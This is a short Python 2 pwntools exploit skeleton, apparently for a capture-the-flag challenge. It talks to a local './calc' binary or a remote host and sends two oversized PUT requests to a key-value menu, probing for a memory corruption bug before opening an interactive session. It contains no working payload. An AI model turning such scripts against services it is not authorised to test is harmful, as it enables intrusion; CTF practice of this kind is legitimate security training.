#!/usr/bin/env python2
# -*- coding:utf-8 -*-
from pwn import *
import os, sys

# switches
DEBUG = 1

# modify this
if DEBUG:
    io = process('./calc')
else:
    io = remote(sys.argv[1], int(sys.argv[2]))

if DEBUG: context(log_level='debug')
# define symbols and offsets here

# simplified r/s function
def ru(delim):
    return io.recvuntil(delim)

def rn(count):
    return io.recvn(count)

def ra(count):      # recv all
    buf = ''
    while count:
        tmp = io.recvn(count)
        buf += tmp 
        count -= len(tmp)
    return buf

def sl(data):
    return io.sendline(data)

def sn(data):
    return io.send(data)

def info(string):
    return log.info(string)

def dehex(s):
    return s.replace(' ','').decode('hex')

# define interactive functions here
def PUT(key, data):
	ru('command:')
	sl('PUT')
	ru('row key:')
	sl(key)
	ru('ata size:')
	sl(str(len(data)))
	ru('data:')
	sl(data)

# define exploit function here
def pwn():
    PUT(b'x' * 0x100, b'X' * 0xff)
    PUT(b'x' * 0x100, b'X' * 0xff)

    io.interactive()
    return

if __name__ == '__main__':
    pause()
    pwn()
